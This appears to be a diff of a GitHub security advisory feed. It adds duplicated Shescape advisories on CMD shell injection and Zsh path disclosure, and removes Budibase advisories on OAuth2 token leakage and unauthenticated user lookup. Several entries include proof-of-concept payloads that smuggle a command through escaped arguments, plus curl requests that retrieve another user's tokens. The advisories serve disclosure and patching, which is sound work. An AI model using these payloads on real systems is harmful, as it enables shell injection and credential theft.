+escapedPayload = shescape.escapeAll([payload]);
+
+// And (example)
+const result = cp.execSync(`if defined FALSY (echo ${escapedPayload})`, options);
+
+// 4. Impact
+console.log(result.toString());
+// Outputs "y" instead of ""
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.</p>
+<p>If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.</p>
+<p>No patches will be released for version of Shescape lower than v2.0.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Alternatively, users of Shescape can remove all instances of <code>(</code> and <code>)</code> from untrusted inputs.</p>
+<h3 id="for-more-information">For more information</h3>
+<ul>
+<li>Comment on Pull Request [#2651] for v2 and [#2649] for v3</li>
+<li>Comment on commit [b4b34c3] for v2 and [43d70b5] for v3</li>
+<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-w4hw-qcx7-56pr">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-w4hw-qcx7-56pr</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2649">https://github.com/ericcornelissen/shescape/pull/2649</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2651">https://github.com/ericcornelissen/shescape/pull/2651</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de">https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f">https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md">https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1">https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-w4hw-qcx7-56pr">https://github.com/advisories/GHSA-w4hw-qcx7-56pr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w4hw-qcx7-56pr</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-24T22:34:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[shescape] Shescape: Shell injection via unescaped parentheses on Windows with CMD]]></title>
+        <id>https://github.com/advisories/GHSA-w4hw-qcx7-56pr</id>
+        <link href="https://github.com/advisories/GHSA-w4hw-qcx7-56pr"/>
+        <updated>2026-07-24T22:34:24.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>This impacts users of Shescape on Windows that explicitly configure <code>shell</code> to CMD, or <code>true</code> with the default shell being CMD, using the <code>escape</code> and <code>escapeAll</code> APIs.</p>
+<p>An attacker may be able to achieve shell injection depending on the original command.</p>
+<pre><code class="language-javascript">import * as cp from "node:child_process";
+import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    shell: "cmd.exe",
+    // Or
+    shell: true, // Only if the default shell is CMD
+};
+
+// 2. Payload
+const payload = "x) else if a==a (echo y";
+
+// 3. Usage
+const shescape = new Shescape(options);
+let escapedPayload;
+
+escapedPayload = shescape.escape(payload);
+// Or
+escapedPayload = shescape.escapeAll([payload]);
+
+// And (example)
+const result = cp.execSync(`if defined FALSY (echo ${escapedPayload})`, options);
+
+// 4. Impact
+console.log(result.toString());
+// Outputs "y" instead of ""
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.</p>
+<p>If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.</p>
+<p>No patches will be released for version of Shescape lower than v2.0.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Alternatively, users of Shescape can remove all instances of <code>(</code> and <code>)</code> from untrusted inputs.</p>
+<h3 id="for-more-information">For more information</h3>
+<ul>
+<li>Comment on Pull Request [#2651] for v2 and [#2649] for v3</li>
+<li>Comment on commit [b4b34c3] for v2 and [43d70b5] for v3</li>
+<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-w4hw-qcx7-56pr">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-w4hw-qcx7-56pr</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2649">https://github.com/ericcornelissen/shescape/pull/2649</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2651">https://github.com/ericcornelissen/shescape/pull/2651</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de">https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f">https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md">https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1">https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-w4hw-qcx7-56pr">https://github.com/advisories/GHSA-w4hw-qcx7-56pr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w4hw-qcx7-56pr</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-24T22:34:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[shescape] Shescape: Path disclosure on Unix with Zsh]]></title>
+        <id>https://github.com/advisories/GHSA-6v4m-fw66-8r4x</id>
+        <link href="https://github.com/advisories/GHSA-6v4m-fw66-8r4x"/>
+        <updated>2026-07-24T22:33:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>This impacts users of Shescape on Unix systems that explicitly configure <code>shell</code> to Zsh, or <code>true</code> when the default shell is Zsh, using the <code>escape</code> and <code>escapeAll</code>. The Zsh options <code>EXTENDED_GLOB</code> and <code>MAGIC_EQUAL_SUBST</code> exacerbate the problem.</p>
+<p>In certain case, an attacker can leverage home directory expansion and extended glob syntax to obtain lists of files and directories on the system. Depending on what the command does, this may be used to leak more information.</p>
+<h4 id="without-option--with-magic_equal_subst">Without option / with <code>MAGIC_EQUAL_SUBST</code></h4>
+<pre><code class="language-javascript">import * as cp from "node:child_process";
+import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    shell: "zsh",
+    // Or
+    shell: true, // Only if the default shell is Zsh
+};
+
+// 2. Payload
+const payload1 = ":~";
+// Or
+const payload2 = "a=~"; // requires MAGIC_EQUAL_SUBST
+
+// 3. Usage
+const shescape = new Shescape(options);
+let escapedPayload;
+
+escapedPayload = shescape.escape(payload1);
+// Or
+escapedPayload = shescape.escapeAll([payload1]);
+// And (example)
+const result1 = cp.execSync(`V=${escapedPayload}; echo $V`, options);
+
+// Or
+escapedPayload = shescape.escape(payload2);
+// Or
+escapedPayload = shescape.escapeAll([payload2]);
+// And (example)
+const result2 = cp.execSync(`echo ${escapedPayload}`, options);
+
+// 4. Impact
+console.log("", result1.toString().trim(), "\n", result2.toString().trim());
+// Outputs ":" followed by the user's home directory on one line and "a="
+// followed by the user's home directory (under MAGIC_EQUAL_SUBST) on the next.
+</code></pre>
+<h4 id="with-extended_glob">With <code>EXTENDED_GLOB</code></h4>
+<pre><code class="language-javascript">import * as cp from "node:child_process";
+import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    shell: "zsh",
+    // Or
+    shell: true, // Only if the default shell is Zsh
+};
+
+// And (example)
+// `setopt EXTENDED_GLOB` in ~/.zshenv
+
+// 2. Payload
+let payload;
+
+payload = "pa#ckage.json";
+// Or
+payload = "^package.json~package-lock.json";
+// Or
+payload = "^nonexistent";
+
+// 3. Usage
+const shescape = new Shescape(options);
+let escapedPayload;
+
+escapedPayload = shescape.escape(payload);
+// Or
+escapedPayload = shescape.escapeAll([payload]);
+
+// And (example)
+const result = cp.execSync(`echo ${escapedPayload}`, options);
+
+// 4. Impact
+console.log(result.toString());
+// Outputs files and directories in the current directory
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.</p>
+<p>If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.</p>
+<p>No patches will be released for version of Shescape lower than v2.0.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Alternatively, users of Shescape can 1) refrain from using Zsh, 2) ensure the <code>EXTENDED_GLOB</code> option is disabled, 3) remove all instances of <code>^</code>, <code>#</code>, and <code>~</code> from untrusted inputs.</p>
+<h3 id="for-more-information">For more information</h3>
+<ul>
+<li>Comment on Pull Request [#2651] for v2 and [#2649] for v3</li>
+<li>Comment on commit [b4b34c3] for v2 and [43d70b5] for v3</li>
+<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-6v4m-fw66-8r4x">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-6v4m-fw66-8r4x</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2649">https://github.com/ericcornelissen/shescape/pull/2649</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2651">https://github.com/ericcornelissen/shescape/pull/2651</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de">https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f">https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md">https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1">https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-6v4m-fw66-8r4x">https://github.com/advisories/GHSA-6v4m-fw66-8r4x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6v4m-fw66-8r4x</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T22:33:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[shescape] Shescape: Path disclosure on Unix with Zsh]]></title>
+        <id>https://github.com/advisories/GHSA-6v4m-fw66-8r4x</id>
+        <link href="https://github.com/advisories/GHSA-6v4m-fw66-8r4x"/>
+        <updated>2026-07-24T22:33:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>This impacts users of Shescape on Unix systems that explicitly configure <code>shell</code> to Zsh, or <code>true</code> when the default shell is Zsh, using the <code>escape</code> and <code>escapeAll</code>. The Zsh options <code>EXTENDED_GLOB</code> and <code>MAGIC_EQUAL_SUBST</code> exacerbate the problem.</p>
+<p>In certain case, an attacker can leverage home directory expansion and extended glob syntax to obtain lists of files and directories on the system. Depending on what the command does, this may be used to leak more information.</p>
+<h4 id="without-option--with-magic_equal_subst">Without option / with <code>MAGIC_EQUAL_SUBST</code></h4>
+<pre><code class="language-javascript">import * as cp from "node:child_process";
+import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    shell: "zsh",
+    // Or
+    shell: true, // Only if the default shell is Zsh
+};
+
+// 2. Payload
+const payload1 = ":~";
+// Or
+const payload2 = "a=~"; // requires MAGIC_EQUAL_SUBST
+
+// 3. Usage
+const shescape = new Shescape(options);
+let escapedPayload;
+
+escapedPayload = shescape.escape(payload1);
+// Or
+escapedPayload = shescape.escapeAll([payload1]);
+// And (example)
+const result1 = cp.execSync(`V=${escapedPayload}; echo $V`, options);
+
+// Or
+escapedPayload = shescape.escape(payload2);
+// Or
+escapedPayload = shescape.escapeAll([payload2]);
+// And (example)
+const result2 = cp.execSync(`echo ${escapedPayload}`, options);
+
+// 4. Impact
+console.log("", result1.toString().trim(), "\n", result2.toString().trim());
+// Outputs ":" followed by the user's home directory on one line and "a="
+// followed by the user's home directory (under MAGIC_EQUAL_SUBST) on the next.
+</code></pre>
+<h4 id="with-extended_glob">With <code>EXTENDED_GLOB</code></h4>
+<pre><code class="language-javascript">import * as cp from "node:child_process";
+import { Shescape } from "shescape";
+
+// 1. Prerequisites
+const options = {
+    shell: "zsh",
+    // Or
+    shell: true, // Only if the default shell is Zsh
+};
+
+// And (example)
+// `setopt EXTENDED_GLOB` in ~/.zshenv
+
+// 2. Payload
+let payload;
+
+payload = "pa#ckage.json";
+// Or
+payload = "^package.json~package-lock.json";
+// Or
+payload = "^nonexistent";
+
+// 3. Usage
+const shescape = new Shescape(options);
+let escapedPayload;
+
+escapedPayload = shescape.escape(payload);
+// Or
+escapedPayload = shescape.escapeAll([payload]);
+
+// And (example)
+const result = cp.execSync(`echo ${escapedPayload}`, options);
+
+// 4. Impact
+console.log(result.toString());
+// Outputs files and directories in the current directory
+</code></pre>
+<h3 id="patches">Patches</h3>
+<p>This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.</p>
+<p>If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.</p>
+<p>No patches will be released for version of Shescape lower than v2.0.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Alternatively, users of Shescape can 1) refrain from using Zsh, 2) ensure the <code>EXTENDED_GLOB</code> option is disabled, 3) remove all instances of <code>^</code>, <code>#</code>, and <code>~</code> from untrusted inputs.</p>
+<h3 id="for-more-information">For more information</h3>
+<ul>
+<li>Comment on Pull Request [#2651] for v2 and [#2649] for v3</li>
+<li>Comment on commit [b4b34c3] for v2 and [43d70b5] for v3</li>
+<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-6v4m-fw66-8r4x">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-6v4m-fw66-8r4x</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2649">https://github.com/ericcornelissen/shescape/pull/2649</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/pull/2651">https://github.com/ericcornelissen/shescape/pull/2651</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de">https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f">https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md">https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14</a></li>
+<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1">https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-6v4m-fw66-8r4x">https://github.com/advisories/GHSA-6v4m-fw66-8r4x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6v4m-fw66-8r4x</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T22:33:38.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[brace-expansion] brace-expansion: DoS via unbounded expansion length causing an out-of-memory process crash]]></title>
         <id>https://github.com/advisories/GHSA-mh99-v99m-4gvg</id>
@@ -1590,922 +2474,5 @@ for (const [key, value] of Object.entries(parameters)) {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-24T21:25:51.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: OAuth2 Token Disclosure via Automation Test Results Broadcast to Other Builders]]></title>
-        <id>https://github.com/advisories/GHSA-gh4h-34gr-87r7</id>
-        <link href="https://github.com/advisories/GHSA-gh4h-34gr-87r7"/>
-        <updated>2026-07-24T21:25:22.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>When an SSO-authenticated user tests an automation in the Budibase builder, their OAuth2 access token and refresh token are included in the automation test results. These results are broadcast via WebSocket to all builders connected to the same dev app and stored in an in-memory cache accessible to any builder who polls the test status endpoint. This allows any co-builder of the same app to steal the testing user's OAuth2 tokens.</p>
-<h2 id="details">Details</h2>
-<p>The vulnerability exists because <code>getUserContextBindings()</code> intentionally includes OAuth2 tokens in user context bindings (so automations can call external APIs), but the automation test pipeline exposes the full result — including these tokens — to all builders of the same app without sanitization.</p>
-<p><strong>Step 1: Tokens included in user bindings</strong></p>
-<p>In <code>packages/server/src/sdk/users/utils.ts:134-161</code>:</p>
-<pre><code class="language-typescript">export function getUserContextBindings(user: ContextUser): UserBindings {
-  const bindings: UserBindings = {
-    _id: user._id,
-    email: user.email,
-    // ...
-  }
-  if (isSSOUser(user) &amp;&amp; user.oauth2) {
-    bindings.oauth2 = {
-      accessToken: user.oauth2.accessToken,   // &lt;-- sensitive
-      refreshToken: user.oauth2.refreshToken,  // &lt;-- sensitive
-    }
-  }
-  return bindings
-}
-</code></pre>
-<p><strong>Step 2: Bindings passed to automation execution</strong></p>
-<p>In <code>packages/server/src/api/controllers/automation.ts:311-312</code>:</p>
-<pre><code class="language-typescript">const user = sdk.users.getUserContextBindings(ctx.user)
-return await triggers.externalTrigger(
-  { ...automation, disabled: false },
-  { ...input, appId, user },  // user with tokens passed as event param
-  { getResponses: true, onProgress: emitProgress }
-)
-</code></pre>
-<p><strong>Step 3: Tokens placed in trigger outputs</strong></p>
-<p>In <code>packages/server/src/threads/automation.ts:409-413</code>:</p>
-<pre><code class="language-typescript">const trigger: AutomationTriggerResult = {
-  id: data.automation.definition.trigger.id,
-  stepId: data.automation.definition.trigger.stepId,
-  inputs: null,
-  outputs: data.event,  // data.event includes user.oauth2 tokens
-}
-</code></pre>
-<p><strong>Step 4: Result broadcast without sanitization</strong></p>
-<p>The full result (including <code>trigger.outputs.user.oauth2</code>) is exposed via two vectors:</p>
-<ol>
-<li><p><strong>WebSocket broadcast</strong> — <code>builderSocket.emitToRoom()</code> calls <code>this.io.in(room).emit()</code> (<code>packages/server/src/websockets/websocket.ts:291</code>) which sends to ALL sockets in the app's room, not just the originator.</p>
-</li>
-<li><p><strong>Test status endpoint</strong> — <code>recordTestProgress()</code> stores the result in a Map keyed by <code>${appId}:${automationId}</code> with no user isolation (<code>packages/server/src/automations/testProgress.ts:41-74</code>). Any builder can call <code>GET /api/automations/:id/test/status</code> to retrieve another user's test results.</p>
-</li>
-</ol>
-<h2 id="poc">PoC</h2>
-<p>Requires two builder-level users on the same Budibase app, where User A authenticates via SSO/OIDC (Google, Azure AD, etc.) which provides OAuth2 tokens.</p>
-<pre><code class="language-bash"># Step 1: User A (SSO-authenticated builder) tests an automation asynchronously
-curl -X POST http://localhost:10000/api/automations/&lt;automation-id&gt;/test?async=true \
-  -H 'x-budibase-app-id: app_dev_&lt;appid&gt;' \
-  -H 'Cookie: budibase:auth=&lt;userA_session&gt;' \
-  -H 'Content-Type: application/json' \
-  -d '{"row": {"tableId": "ta_xxx"}}'
-# Returns: {"message": "Automation test started"}
-
-# Step 2: User B (another builder on the same app) polls the test status
-curl -X GET http://localhost:10000/api/automations/&lt;automation-id&gt;/test/status \
-  -H 'x-budibase-app-id: app_dev_&lt;appid&gt;' \
-  -H 'Cookie: budibase:auth=&lt;userB_session&gt;'
-
-# Response includes the full automation result with:
-# result.trigger.outputs.user.oauth2.accessToken = "ya29.a0AfH6SM..."
-# result.trigger.outputs.user.oauth2.refreshToken = "1//0eXyz..."
-</code></pre>
-<p>Additionally, User B can passively receive the tokens by simply having the Budibase builder open (connected via WebSocket), as the <code>BuilderSocketEvent.AutomationTestProgress</code> event with <code>status: "complete"</code> includes the full result payload.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>OAuth2 access tokens</strong> for external services (Google Workspace, Azure AD, GitHub, etc.) are exposed to co-builders of the same app. These tokens can be used to access external APIs as the victim user.</li>
-<li><strong>OAuth2 refresh tokens</strong> provide persistent access — an attacker can generate new access tokens even after the original expires, maintaining long-term access to the victim's external service accounts.</li>
-<li>The attack is passive via WebSocket — an attacker only needs to have the builder UI open to receive tokens when any co-builder tests an automation.</li>
-<li>Test results persist in memory for 5 minutes (TTL in <code>testProgress.ts:15</code>), providing a window for polling-based attacks.</li>
-</ul>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Strip OAuth2 tokens from automation test results before storing/broadcasting them. The tokens are needed during automation execution but should not be included in the result sent to clients.</p>
-<p>In <code>packages/server/src/api/controllers/automation.ts</code>, sanitize the result before passing to <code>emitProgress</code>:</p>
-<pre><code class="language-typescript">function sanitizeAutomationResult(result: AutomationResults): AutomationResults {
-  const sanitized = cloneDeep(result)
-  if (sanitized.trigger?.outputs?.user?.oauth2) {
-    delete sanitized.trigger.outputs.user.oauth2
-  }
-  for (const step of sanitized.steps || []) {
-    if (step.outputs?.user?.oauth2) {
-      delete step.outputs.user.oauth2
-    }
-  }
-  return sanitized
-}
-</code></pre>
-<p>Apply sanitization in the <code>emitProgress</code> callback at line 290 and before returning <code>ctx.body</code> at line 342:</p>
-<pre><code class="language-typescript">emitProgress({
-  status: "complete",
-  occurredAt: Date.now(),
-  result: sanitizeAutomationResult(result),
-})
-</code></pre>
-<p>Additionally, the <code>testProgress</code> store should be scoped per-user (keyed by <code>${appId}:${automationId}:${userId}</code>) so that one builder's test results are not accessible to another builder via the <code>testStatus</code> endpoint.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-gh4h-34gr-87r7">https://github.com/Budibase/budibase/security/advisories/GHSA-gh4h-34gr-87r7</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/19107">https://github.com/Budibase/budibase/pull/19107</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/bca426de7dc36d680285295655dc640dea2aab21">https://github.com/Budibase/budibase/commit/bca426de7dc36d680285295655dc640dea2aab21</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.25">https://github.com/Budibase/budibase/releases/tag/3.39.25</a></li>
-<li><a href="https://github.com/advisories/GHSA-gh4h-34gr-87r7">https://github.com/advisories/GHSA-gh4h-34gr-87r7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gh4h-34gr-87r7</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-24T21:25:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: Unauthenticated user information disclosure via public tenant user lookup endpoint]]></title>
-        <id>https://github.com/advisories/GHSA-hr66-5mqr-8mpx</id>
-        <link href="https://github.com/advisories/GHSA-hr66-5mqr-8mpx"/>
-        <updated>2026-07-24T21:25:02.000Z</updated>
-        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
-<p>The Budibase Worker service exposes a public, unauthenticated API endpoint (<code>GET /api/global/users/tenant/:id</code>) that returns sensitive user information including <code>tenantId</code>, <code>userId</code>, <code>email</code>, and <code>ssoId</code>. The endpoint is registered in the <code>PUBLIC_ENDPOINTS</code> list with a <code>TODO</code> comment acknowledging it "should be an internal API." Any unauthenticated party can enumerate user emails or IDs to extract sensitive tenant and user metadata, enabling targeted attacks against multi-tenant deployments.</p>
-<h4 id="details">Details</h4>
-<p><strong>Public endpoint registration</strong> at <code>packages/worker/src/api/index.ts</code> lines 56-59:</p>
-<pre><code class="language-typescript">// TODO: This should be an internal api
-{
-  route: "/api/global/users/tenant/:id",
-  method: "GET",
-},
-</code></pre>
-<p>This endpoint is listed in <code>PUBLIC_ENDPOINTS</code>, which is passed to <code>auth.buildAuthMiddleware(PUBLIC_ENDPOINTS)</code> at line 154. When a request matches a public endpoint pattern, the authentication middleware sets <code>ctx.publicEndpoint = true</code> and calls <code>next()</code> without performing any authentication (verified at <code>packages/backend-core/src/middleware/authenticated.ts</code> lines 124-126, 249-251).</p>
-<p>All subsequent middleware also skips for public endpoints:</p>
-<ul>
-<li><code>buildTenancyMiddleware</code> — passes through</li>
-<li><code>activeTenant</code> — passes through</li>
-<li><code>buildCsrfMiddleware</code> — skipped for GET methods (line 48 of csrf.ts)</li>
-<li>The <code>budibaseAccess</code> gate at lines 160-168 explicitly returns <code>next()</code> when <code>ctx.publicEndpoint</code> is true</li>
-</ul>
-<p><strong>Route registration</strong> at <code>packages/worker/src/api/routes/global/users.ts</code> line 139:</p>
-<pre><code class="language-typescript">loggedInRoutes
-  .get("/api/global/users/tenant/:id", controller.tenantUserLookup)
-</code></pre>
-<p><code>loggedInRoutes</code> has no auth middleware group — it is created with <code>endpointGroupList.group()</code> (no middleware).</p>
-<p><strong>Handler implementation</strong> at <code>packages/worker/src/api/controllers/global/users.ts</code> lines 548-562:</p>
-<pre><code class="language-typescript">export const tenantUserLookup = async (
-  ctx: UserCtx&lt;void, LookupTenantUserResponse&gt;
-) =&gt; {
-  const id = ctx.params.id
-  // is email, check its valid
-  if (id.includes("@") &amp;&amp; !emailValidator.validate(id)) {
-    ctx.throw(400, `${id} is not a valid email address to lookup.`)
-  }
-  const user = await userSdk.core.getFirstPlatformUser(id)
-  if (user) {
-    ctx.body = user    // Returns full PlatformUser object — no field filtering
-  } else {
-    ctx.throw(400, "No tenant user found.")
-  }
-}
-</code></pre>
-<p>The <code>id</code> parameter accepts either an email address (detected by <code>@</code> presence) or a user ID. The response returns the <strong>full</strong> <code>PlatformUser</code> object from <code>packages/types/src/documents/platform/users.ts</code>:</p>
-<pre><code class="language-typescript">export interface PlatformUserByEmail extends Document {
-  tenantId: string    // Tenant identifier
-  userId: string      // Internal user ID
-}
-
-export interface PlatformUserById extends Document {
-  tenantId: string    // Tenant identifier
-  email?: string      // User email address
-  ssoId?: string      // SSO provider identifier
-}
-
-export interface PlatformUserBySsoId extends Document {
-  tenantId: string    // Tenant identifier
-  userId: string      // Internal user ID
-  email: string       // User email address
-  ssoId?: string      // SSO provider identifier
-}
-</code></pre>
-<p>The lookup function (<code>packages/backend-core/src/users/lookup.ts:48-53</code>) queries the <code>PLATFORM_USERS_LOWERCASE</code> CouchDB view with <code>include_docs: true</code>, returning the complete platform user document including CouchDB <code>_id</code> and <code>_rev</code>.</p>
-<p><strong>Affected files:</strong></p>
-<ul>
-<li><code>packages/worker/src/api/index.ts:56-59</code> — Public endpoint registration</li>
-<li><code>packages/worker/src/api/routes/global/users.ts:139</code> — Route on unauthenticated group</li>
-<li><code>packages/worker/src/api/controllers/global/users.ts:548-562</code> — Handler returning full user object</li>
-<li><code>packages/backend-core/src/users/lookup.ts:48-53</code> — Platform user lookup with <code>include_docs: true</code></li>
-<li><code>packages/types/src/documents/platform/users.ts:6-36</code> — PlatformUser types</li>
-</ul>
-<h4 id="poc">PoC</h4>
